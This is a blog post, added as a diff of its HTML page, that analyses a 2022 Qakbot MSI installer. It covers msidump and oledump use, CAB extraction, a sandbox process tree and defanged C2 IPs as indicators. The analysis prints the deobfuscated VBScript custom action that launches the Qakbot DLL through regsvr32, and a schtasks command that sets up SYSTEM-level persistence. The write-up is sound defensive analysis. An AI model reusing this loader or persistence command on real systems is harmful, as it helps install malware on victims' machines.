@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        QakbotMSI ::
+        Axelarator Blog — A simple theme for Hugo
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Executive Summary #   In mid-April 2022, Mandiant observed UNC2500 campaigns using MSI packages to distribute Qakbot payloads. This change comes shortly after Microsoft’s announcement that macros from Office documents downloaded from the internet (ZoneIdentifier ADS) will be blocked by default. This new payload uses a botnet ID AA, which is unique from previous campaigns that have used tr, cullinan, and cullinan01. Distribution came from phishing emails containing a malicious link from either OneDrive or files hosted on compromised websites that downloads a ZIP archive."
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://axelarator.github.io/posts/qakbotmsi/" />
+
+
+
+
+
+<link rel="stylesheet" href="https://axelarator.github.io/assets/style.css" />
+
+<link rel="stylesheet" href="https://axelarator.github.io/style.css" />
+
+
+<link
+  rel="apple-touch-icon-precomposed"
+  sizes="144x144"
+  href="https://axelarator.github.io/img/apple-touch-icon-144-precomposed.png"
+/>
+<link rel="shortcut icon" href="https://axelarator.github.io/img/favicon.png" />
+
+
+<link href="https://axelarator.github.io/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://axelarator.github.io/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://axelarator.github.io/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://axelarator.github.io/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://axelarator.github.io/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="https://axelarator.github.io/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="QakbotMSI"/>
+<meta name="twitter:description" content="Executive Summary #   In mid-April 2022, Mandiant observed UNC2500 campaigns using MSI packages to distribute Qakbot payloads. This change comes shortly after Microsoft’s announcement that macros from Office documents downloaded from the internet (ZoneIdentifier ADS) will be blocked by default. This new payload uses a botnet ID AA, which is unique from previous campaigns that have used tr, cullinan, and cullinan01. Distribution came from phishing emails containing a malicious link from either OneDrive or files hosted on compromised websites that downloads a ZIP archive."/>
+
+
+
+<meta property="og:title" content="QakbotMSI" />
+<meta property="og:description" content="Executive Summary #   In mid-April 2022, Mandiant observed UNC2500 campaigns using MSI packages to distribute Qakbot payloads. This change comes shortly after Microsoft’s announcement that macros from Office documents downloaded from the internet (ZoneIdentifier ADS) will be blocked by default. This new payload uses a botnet ID AA, which is unique from previous campaigns that have used tr, cullinan, and cullinan01. Distribution came from phishing emails containing a malicious link from either OneDrive or files hosted on compromised websites that downloads a ZIP archive." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://axelarator.github.io/posts/qakbotmsi/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-06-21T18:11:53-04:00" />
+<meta property="article:modified_time" content="2022-06-21T18:11:53-04:00" /><meta property="og:site_name" content="Axelarator Blog" />
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/public"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >Axelarator</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title">QakbotMSI</h1>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2022-06-21
+        </span>
+
+        
+          
+        
+      
+
+      
+
+
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+      <h3 id="executive-summary">
+  Executive Summary
+  <a href="#executive-summary" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<ul>
+<li>In mid-April 2022, Mandiant observed UNC2500 campaigns using MSI packages to distribute Qakbot payloads.</li>
+<li>This change comes shortly after Microsoft’s announcement that macros from Office documents downloaded from the internet (ZoneIdentifier ADS) will be blocked by default.</li>
+<li>This new payload uses a botnet ID <strong>AA,</strong> which is unique from previous campaigns that have used <strong>tr</strong>, <strong>cullinan</strong>, and <strong>cullinan01</strong>.</li>
+<li>Distribution came from phishing emails containing a malicious link from either OneDrive or files hosted on compromised websites that downloads a ZIP archive. That archive contains a Windows Installer Package (MSI) file. When the user executes the MSI file, a Qakbot DLL contained within an embedded Windows Cabinet File (CAB)  is executed.</li>
+</ul>
+<h3 id="analysis">
+  Analysis
+  <a href="#analysis" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>This sample was originally published by @pr0xylife.</p>
+<p>I downloaded the MSI sample on both Remnux and FlareVM for static and dynamic analysis respectively.</p>
+<p><a href="https://twitter.com/pr0xylife/status/1521445754216267776">https://twitter.com/pr0xylife/status/1521445754216267776</a></p>
+<p>First is to just look at the file properties to see if there are any immediate indicators. An organization and an email.</p>
+<p><img src="/Qakbot/Untitled.png" alt="Untitled"></p>
+<p><code>msidump</code> will dump all streams and tables from the MSI file. <code>oledump</code> can also be used and I’ll show an example of that too, but I found <code>msidump</code> just makes things a bit easier.</p>
+<h3 id="streams-and-tables">
+  Streams and Tables
+  <a href="#streams-and-tables" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>Every .idt file below is a table. More specifically, an Installer Database Table. Using the <code>-s</code> and <code>-t</code> flag, <strong>_Tables</strong> and <strong>_Streams</strong> are outputted below.</p>
+<p><strong>_Tables</strong> table lists all tables (.idt files) in the database.</p>
+<p><strong>_Streams</strong> table lists embedded OLE data streams. It is a temporary table created only when referenced by a SQL statement.</p>
+<p><strong>Binary</strong> folder is used to store data from <code>Binary.idt</code>. The binary table holds binary data for items like bitmaps, animations, and icons. It’s also used to store data for <strong>custom actions</strong> (more on this later)<strong>.</strong></p>
+<h3 id="msidump">
+  msidump
+  <a href="#msidump" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p><img src="/Qakbot/Untitled%201.png" alt="Untitled"></p>
+<p><img src="/Qakbot/Untitled%202.png" alt="Untitled"></p>
+<ul>
+<li><code>*.idt</code> are database files containing table data.</li>
+<li><code>Binary/</code> and <code>_Streams/</code> hold executable and stream data.</li>
+</ul>
+<h3 id="oledump-example">
+  Oledump Example
+  <a href="#oledump-example" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p><code>msidump</code> above gave a lot of useful information quickly, but as stated, MSI files contain OLE stream data, so <code>oledump</code> could be used as well.</p>
+<p>Most of the text below is unreadable (for those that aren’t bilingual) but what’s more important is the middle column signifying stream byte size.</p>
+<p><img src="/Qakbot/Untitled%203.png" alt="Untitled"></p>
+<p>Going for the largest stream first seems profitable, so I’ll start with 4.</p>
+<p><img src="/Qakbot/Untitled%204.png" alt="Untitled"></p>
+<p>Ignore the broken pipe error. Main thing to focus on is the <code>MSCF</code> file signature which is a <strong>Microsoft Cabinet Archive File.</strong> Keep note of this.</p>
+<p>Next is stream 5, but I won’t go further since the rest of the analysis was done using <code>msidump</code>.</p>
+<p><img src="/Qakbot/Untitled%205.png" alt="Untitled"></p>
+<p>The <code>BM</code> file signature is for bitmap images. Possibly for something in the MSI application window?</p>
+<p>Anyways, that was just an example of using <code>oledump.py</code>. It’s a bit more tedious to get table data, but it’s still possible. I’d just rather have all files readily available to look at. Back to the real task.</p>
+<h3 id="more-tables">
+  More Tables
+  <a href="#more-tables" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>The <strong>CustomAction</strong> file can often contain malicious code for further execution, so that’s a good one to check first.</p>
+<p><img src="/Qakbot/Untitled%206.png" alt="Untitled"></p>
+<p><code>DIRCA_TARGETDIR</code> notes something gets installed to the <code>%LOCALAPPDATA%\ProductName</code> folder. This at least gives a location to check on Windows machines for file creation.</p>
+<p>Note: [ProductName] is a placeholder for the actual package getting installed. As seen in the embedded tweet above, the package is called SetupTest, so something will evidently get installed to <code>%localappdata%\SetupTest</code>.</p>
+<p>That line above <code>DIRCA_TARGETDIR</code> points to a binary stream which may give more details about the action.</p>
+<p>Listing the stream data gives some obfuscated output.</p>
+<p><img src="/Qakbot/Untitled%207.png" alt="Untitled"></p>
+<p>But thanks to this <a href="https://twitter.com/ankit_anubhav/status/1521473716332339200?s=20&amp;t=Bgp9wbsMNh2-k3FyXotADQ">tweet</a>, a few find/replace operations in CyberChef can clear up the output a bit. Luckily this stream was lightly obfuscated.</p>
+<p><img src="/Qakbot/Untitled%208.png" alt="Untitled"></p>
+<p>Cleaned up output. Looking at line 4, now we know the name of the directory and a specific file written to it. This eases the dynamic analysis a bit on the Windows machine.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-jsx" data-lang="jsx"><span style="color:#a6e22e">EVUCQUJ8D4</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">EVUCQUJ8D4</span> <span style="color:#f92672">&amp;</span> <span style="color:#e6db74">&#34;VZUMLKCQLE = VZUMLKCQLE &amp; &#34;&#34;Set objShell = CreateObject( &#34;&#34;&#34;&#34;WScript.Shell&#34;&#34;&#34;&#34; )&#34;&#34; &amp; Vbcrlf&#34;</span> <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">Vbcrlf</span>
+<span style="color:#a6e22e">EVUCQUJ8D4</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">EVUCQUJ8D4</span> <span style="color:#f92672">&amp;</span> <span style="color:#e6db74">&#34;VZUMLKCQLE = VZUMLKCQLE &amp; &#34;&#34;Dim reg&#34;&#34; &amp; Vbcrlf&#34;</span> <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">Vbcrlf</span>
+<span style="color:#a6e22e">EVUCQUJ8D4</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">EVUCQUJ8D4</span> <span style="color:#f92672">&amp;</span> <span style="color:#e6db74">&#34;VZUMLKCQLE = VZUMLKCQLE &amp; &#34;&#34;reg = &#34;&#34;&#34;&#34;regsvr32.exe &#34;&#34;&#34;&#34;&#34;&#34; &amp; Vbcrlf&#34;</span> <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">Vbcrlf</span>
+<span style="color:#a6e22e">EVUCQUJ8D4</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">EVUCQUJ8D4</span> <span style="color:#f92672">&amp;</span> <span style="color:#e6db74">&#34;VZUMLKCQLE = VZUMLKCQLE &amp; &#34;&#34;objShell.run reg &amp; objShell.ExpandEnvironmentStrings(&#34;&#34;&#34;&#34;%localappdata%&#34;&#34;&#34;&#34; &amp; &#34;&#34;&#34;&#34;\SetupTest\&#34;&#34;&#34;&#34;</span> <span style="color:#f92672">&amp;</span> <span style="color:#e6db74">&#34;&#34;&#34;&#34;</span><span style="color:#ae81ff">5.</span><span style="color:#a6e22e">dll</span><span style="color:#e6db74">&#34;&#34;&#34;&#34;</span>)<span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">&amp;</span> <span style="color:#a6e22e">Vbcrlf</span><span style="color:#e6db74">&#34; &amp; Vbcrlf
+</span><span style="color:#e6db74">EVUCQUJ8D4 = EVUCQUJ8D4 &amp; &#34;</span><span style="color:#a6e22e">VZUMLKCQLE</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Replace</span>(<span style="color:#a6e22e">VZUMLKCQLE</span>, <span style="color:#e6db74">&#34;&#34;&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;&#34;&#34;</span>)<span style="color:#e6db74">&#34; &amp; Vbcrlf
+</span><span style="color:#e6db74">EVUCQUJ8D4 = EVUCQUJ8D4 &amp; &#34;</span><span style="color:#a6e22e">Execute</span> <span style="color:#a6e22e">VZUMLKCQLE</span><span style="color:#e6db74">&#34; &amp; Vbcrlf
+</span><span style="color:#e6db74">EVUCQUJ8D4 = Replace(EVUCQUJ8D4, &#34;&#34;, &#34;</span><span style="color:#960050;background-color:#1e0010">&#34;</span>)
+</code></pre></div><p>Next is the Property table.</p>
+<p><img src="/Qakbot/Untitled%209.png" alt="Untitled"></p>
+<p>Nothing&hellip;time to switch to <code>_Streams</code>. Sometimes the Manufacturer key can list interesting details, but not this time.</p>
+<p><img src="/Qakbot/Untitled%2010.png" alt="Untitled"></p>
+<p>A <strong>Microsoft Archive Cabinet File</strong>? Where was that seen before? (hint: oledump)</p>
+<p>Since it’s an archive file, time to use 7z to extract it.</p>
+<p><img src="/Qakbot/Untitled%2011.png" alt="Untitled"></p>
+<p>Finally getting somewhere. A new file (<code>_699ADF8C0A7E43ED9D8607CA4CFAFB26</code>) was extracted and it is a PE32 executable DLL. This further proves the output from that obfuscated code in CyberChef.</p>
+<p>After grabbing the MD5 of the DLL, it appears on MalwareBazaar.</p>
+<p><img src="/Qakbot/Untitled%2012.png" alt="Untitled"></p>
+<p>Remember above how the CustomAction.idt file showed a target directory. Well&hellip;</p>
+<p><img src="/Qakbot/Untitled%2013.png" alt="Untitled"></p>
+<p>There’s the same .dll pulled from the <code>_Streams</code> directory. <code>SetupTest</code> is the ProductName within <code>LocalAppDataFolder\ProductName</code>.</p>
+<p>The sample is heavily packed with an entropy of 7.69 so I’ll view sandbox details instead. The sample on intezer was downloaded to <code>%localappdata%\Temp</code> instead of <code>%localappdata%\SetupTest</code> but besides that, everything else is the same.</p>
+<p><a href="https://analyze.intezer.com/analyses/42429a7f-36f2-4977-909b-ba67d0398810/genetic-analysis"></a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-jsx" data-lang="jsx"><span style="color:#e6db74">&#34;C:\Windows\System32\rundll32.exe&#34;</span> <span style="color:#e6db74">&#34;C:\Users\&lt;USER&gt;\AppData\Local\Temp\&lt;ANALYZED-FILE-NAME&gt;&#34;</span>,<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span>
+	<span style="color:#a6e22e">C</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">Windows</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">SysWOW64</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">explorer</span>.<span style="color:#a6e22e">exe</span>
+		<span style="color:#e6db74">&#34;C:\Windows\system32\schtasks.exe&#34;</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">Create</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">RU</span> <span style="color:#e6db74">&#34;NT AUTHORITY\SYSTEM&#34;</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">tn</span> <span style="color:#a6e22e">okebdbmlat</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">tr</span> <span style="color:#e6db74">&#34;regsvr32.exe -s \&#34;C:\Users\&lt;USER&gt;\AppData\Local\Temp\&lt;ANALYZED-FILE-NAME&gt;\&#34;&#34;</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">SC</span> <span style="color:#a6e22e">ONCE</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">Z</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">ST</span> <span style="color:#ae81ff">19</span><span style="color:#f92672">:</span><span style="color:#ae81ff">48</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">ET</span> <span style="color:#ae81ff">20</span><span style="color:#f92672">:</span><span style="color:#ae81ff">00</span>
+			<span style="color:#a6e22e">C</span><span style="color:#f92672">:</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">Windows</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">system32</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">svchost</span>.<span style="color:#a6e22e">exe</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">k</span> <span style="color:#a6e22e">netsvcs</span>
+</code></pre></div><h3 id="network-activity">
+  Network Activity
+  <a href="#network-activity" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>Using FakeNetNG, I was able to capture some IPs albeit with different host IDs but sharing the same ASN. So new IOCs!</p>
+<ul>
+<li>24.55.67[.]41</li>
+<li>82.152.39[.]49</li>
+<li>92.132.172[.]110</li>
+<li>186.64.67[.]30</li>
+<li>203.122.46[.]188</li>
+</ul>
+<h3 id="conclusion">
+  Conclusion
+  <a href="#conclusion" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p>This Qakbot sample shows threat actors are moving fast to find new infection vectors that aren’t Office macros given the recent crackdown from Microsoft. I showed a few ways to pull details from an MSI file and luckily even got some new IOCs. Qakbot isn’t the first to adapt to this though. Prior MSI files include:</p>
+<ul>
+<li><a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.arkei_stealer">Arkei</a></li>
+<li><a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.njrat">NjRAT</a></li>
+<li><a href="https://malpedia.caad.fkie.fraunhofer.de/details/jar.strrat">STRRAT</a></li>
+</ul>
+<hr>
+<h3 id="iocs">
+  IOCs
+  <a href="#iocs" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p><a href="https://github.com/pr0xylife/Qakbot/blob/main/Qakbot_AA_03.05.2022.txt">Qakbot/Qakbot_AA_03.05.2022.txt at main · pr0xylife/Qakbot</a></p>
+<h3 id="references">
+  References
+  <a href="#references" class="h-anchor" aria-hidden="true">#</a>
+</h3>
+<p><a href="https://bazaar.abuse.ch/sample/8cc8f32b2f44e84325e5153ec4fd60c31a35884220e7c36b753550356d6a25c8/">MalwareBazaar | Browse malware samples</a></p>
+<p><a href="https://bazaar.abuse.ch/sample/0150eb84d16f0330b2952c9c722fbf55e47d9697b27de9335de6113556e9b317/">MalwareBazaar | Browse malware samples</a></p>
+<p><a href="https://filesec.io/msi">Filesec.io</a></p>
+<p><a href="https://filesec.io/cab">Filesec.io</a></p>
+<p><a href="https://docs.microsoft.com/en-us/windows/win32/msi/database-tables">Database Tables - Win32 apps</a></p>
+<p><a href="https://forensicitguy.github.io/analyzing-stealer-msi-using-msitools/">Analyzing a Stealer MSI using msitools</a></p>
+
+    </div>
+    
+      
+    
+
+    
+      
+        
+
+      
+    
+  </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/public"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >Axelarator</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span
+          >© 2022 Powered by
+          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span
+        >
+        <span
+          >Theme created by
+          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span
+        >
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://axelarator.github.io/assets/main.js"></script>
+<script src="https://axelarator.github.io/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
